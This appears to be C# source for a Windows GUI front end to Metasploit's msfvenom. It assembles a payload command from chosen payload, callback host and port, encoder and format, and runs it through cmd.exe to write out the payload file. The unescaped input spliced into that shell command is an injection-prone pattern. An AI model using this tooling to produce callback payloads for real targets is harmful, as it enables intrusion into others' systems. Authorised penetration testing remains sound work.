using System;
using AntdUI;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.IO;

namespace Msfvenom_UI
{
    public partial class Form1 : Form
    {
        string Payload = "";
        string Lhost = "";
        string Lport = "";
        string Encoder = "";
        string Encoder_Num = "";
        string Format = "";
        string DelText = "";
        string OutPutPath = "";
        string console = "";
        string FileName = GetRandomString(5, false, true, true, false, "");
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            new AntdUI.Message.Config(this, "双击复制选框", TType.Info)
            {
                ShowInWindow = true,
                ClickClose = false,
                AutoClose = 3
            }.open();
            input6.Text = Environment.CurrentDirectory;
            UpdateConsole();
        }
        private void input1_DoubleClick(object sender, EventArgs e)
        {
            Clipboard.SetText(input1.Text);
            new AntdUI.Message.Config(this, "已复制", TType.Success)
            {
                ShowInWindow = true,
                ClickClose = false,
                AutoClose = 2
            }.open();
        }
        private void button1_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
            folderBrowserDialog.Description = "选择文件夹";
            folderBrowserDialog.ShowNewFolderButton = true;

            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
            {
                string selectedPath = folderBrowserDialog.SelectedPath;
                input6.Text = selectedPath;
            }
        }
        public void UpdateConsole()
        {
            Payload = dropdown1.Text;
            Lhost = input2.Text;
            Lport = input3.Text;
            Encoder = dropdown2.Text;
            Encoder_Num = input5.Text;
            DelText = input4.Text;
            Format = dropdown4.Text;
            OutPutPath = input6.Text;
            console = $"msfvenom -p {Payload} LHOST={Lhost} LPORT={Lport} -e {Encoder} -i {Encoder_Num} -b \"{DelText}\" -f {Format} -o {OutPutPath}" + @"\" + FileName + $".{Format}";
            if (Encoder == "none")
            {
                console = console.Replace($"-e {Encoder}", "");
            }
            if (DelText == "")
            {
                console = console.Replace($"-b \"\"", "");
            }
            input1.Text = console;
        }
  
        private void button2_Click(object sender, EventArgs e)
        {
            button2.Loading = true;
            ThreadPool.QueueUserWorkItem(state =>
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c {console}";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;
                process.EnableRaisingEvents = true;
                process.Exited += (s, args) =>
                {
                    button2.Invoke((Action)(() =>
                    {
                        button2.Loading = false;
                        if (File.Exists($"{OutPutPath}" + @"\" + FileName + $".{Format}"))
                        {
                            new AntdUI.Message.Config(this, "生成成功", TType.Success)
                            {
                                ShowInWindow = true,
                                ClickClose = false,
                                AutoClose = 2
                            }.open();
                        }
                        else 
                        {
                            new AntdUI.Message.Config(this, "生成失败", TType.Error)
                            {
                                ShowInWindow = true,
                                ClickClose = false,
                                AutoClose = 2
                            }.open();
                        }
                    }));
                };
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
            });
        }
        private void dropdown4_SelectedValueChanged(object sender, ObjectNEventArgs e)
        {
            dropdown4.Text = e.Value.ToString();
            UpdateConsole();
        }
        private void dropdown2_SelectedValueChanged(object sender, ObjectNEventArgs e)
        {
            dropdown2.Text = e.Value.ToString();
            UpdateConsole();
        }
        private void dropdown1_SelectedValueChanged(object sender, ObjectNEventArgs e)
        {
            dropdown1.Text = e.Value.ToString();
            UpdateConsole();
        }
        private void input2_TextChanged(object sender, EventArgs e)
        {
            UpdateConsole();
        }
        private void input3_TextChanged(object sender, EventArgs e)
        {
            UpdateConsole();
        }
        private void input5_TextChanged(object sender, EventArgs e)
        {
            UpdateConsole();
        }
        private void input4_TextChanged(object sender, EventArgs e)
        {
            UpdateConsole();
        }
        private void input6_TextChanged(object sender, EventArgs e)
        {
            UpdateConsole();
        }
        public static string GetRandomString(int length, bool useNum, bool useLow, bool useUpp, bool useSpe, string custom)
        {
            byte[] b = new byte[4];
            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
            Random r = new Random(BitConverter.ToInt32(b, 0));
            string s = null, str = custom;
            if (useNum == true) { str += "0123456789"; }
            if (useLow == true) { str += "abcdefghijklmnopqrstuvwxyz"; }
            if (useUpp == true) { str += "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; }
            if (useSpe == true) { str += "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"; }
            for (int i = 0; i < length; i++)
            {
                s += str.Substring(r.Next(0, str.Length - 1), 1);
            }
            return s;
        }

    }
}
